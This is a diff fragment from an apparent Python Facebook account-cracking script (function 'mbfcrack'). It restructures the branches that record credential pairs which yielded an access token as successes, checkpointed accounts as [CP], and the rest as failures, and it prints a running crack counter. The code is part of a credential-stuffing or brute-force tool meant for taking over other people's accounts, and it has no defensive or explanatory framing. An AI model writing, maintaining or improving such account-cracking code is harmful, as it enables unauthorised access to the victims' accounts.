@@ -166,12 +166,14 @@ def mbfcrack():
             if "access_token" in jsl:
                 dados.append(h+" [OK] " + pu + user + " | " + a + password)
                 count += 1
-            elif "error_msg" in jsl:
-                gagal.append(m+" [CP] " + d + user + " | " + m + password)
-                count += 1
+                
             else:
-                oradadi.append(user)
-                count += 1
+                if "error_msg" in jsl:
+                    gagal.append(m+" [CP] " + d + user + " | " + m + password)
+                    count += 1
+                else:
+                    oradadi.append(user)
+                    count += 1
         
             sys.stdout.write(pu+ "\r [$]" + a + " Crack " + p + str(len(baris)) + pu + " / " + p + str(count) + m + " [ " + h + str(len(dados)) + pu + " / " + k + str(len(gagal)) + m + " ]")
             sys.stdout.flush()
